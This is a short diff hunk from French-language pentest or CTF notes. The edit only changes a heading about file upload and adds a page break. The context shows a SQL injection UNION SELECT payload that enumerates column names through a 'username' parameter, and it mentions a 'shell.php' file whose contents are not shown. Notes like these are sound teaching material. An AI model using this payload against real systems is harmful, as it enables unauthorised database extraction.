@@ -510,7 +510,9 @@ username=tom'+UNION+SELECT+NULL,NULL,group_concat(0x7c,column_name,0x7c),NULL,NU
 
 Une fois les tables et colonnes identifiées. On peut récupérer des données comme vu précédement en insérant un `SELECT nom_de_colonne FROM table`.
 
-## Upload de fichier
+\newpage
+
+# Upload de fichier
 
 Fichier shell.php: 
 
